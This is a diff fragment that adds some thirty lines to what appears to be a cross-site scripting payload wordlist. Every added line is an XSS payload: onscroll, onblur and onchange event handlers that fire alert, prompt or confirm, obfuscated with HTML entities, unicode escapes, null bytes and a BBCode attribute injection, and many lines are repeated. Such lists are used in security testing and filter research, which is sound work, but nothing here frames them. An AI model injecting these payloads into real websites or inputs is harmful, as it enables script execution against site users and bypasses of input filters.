@@ -519,3 +519,37 @@
 &#34;&#62;<h1/onscroll='\u0061lert(1)'>
 <a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
 <a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onblur=alert(document.domain)>
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>%00
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onscroll=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onscroll=confirm(1)>'
+&#13;<blink/&#13; onscroll=pr&#x6F;mp&#116;(1)>onscroll
+<var onscroll="prompt(1)">On Mouse Over</var>
+<var onscroll="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onscroll="prompt(1)" onscroll="alert(1)">x</button>
+<div/onscroll='alert(1)'> style="x:">
+[color=red' onscroll="alert('xss')"]mouse over[/color] 
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onchange=alert(document.domain)>
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>%00
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onscroll=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onscroll=confirm(1)>'
+&#13;<blink/&#13; onscroll=pr&#x6F;mp&#116;(1)>onscroll
+<var onscroll="prompt(1)">On Mouse Over</var>
+<var onscroll="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onscroll="prompt(1)" onscroll="alert(1)">x</button>
+<div/onscroll='alert(1)'> style="x:">
+[color=red' onscroll="alert('xss')"]mouse over[/color] 
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
